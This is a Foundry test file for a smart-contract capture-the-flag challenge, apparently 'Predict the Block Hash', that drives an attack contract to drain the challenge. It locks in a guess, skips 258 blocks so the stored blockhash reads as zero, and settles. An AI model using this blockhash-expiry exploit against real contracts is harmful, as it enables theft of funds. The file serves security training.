// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { PredictTheBlockHashChallenge } from "../src/challenges/09_PredictTheBlockHash/PredictTheBlockHashChallenge.sol";
import { PredictTheBlockHashAttack } from "../src/attacks/PredictTheBlockHashAttack.sol";

contract PredictTheBlockHashTest is Test {
    PredictTheBlockHashChallenge public challenge;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{ value: 1 ether }();
    }

    function test() public {
        PredictTheBlockHashAttack attacker = new PredictTheBlockHashAttack();

        attacker.lockInGuess{ value: 1 ether }(challenge);
        vm.roll(block.number + 258);
        attacker.settle(challenge);

        assertTrue(challenge.isComplete());
    }
}
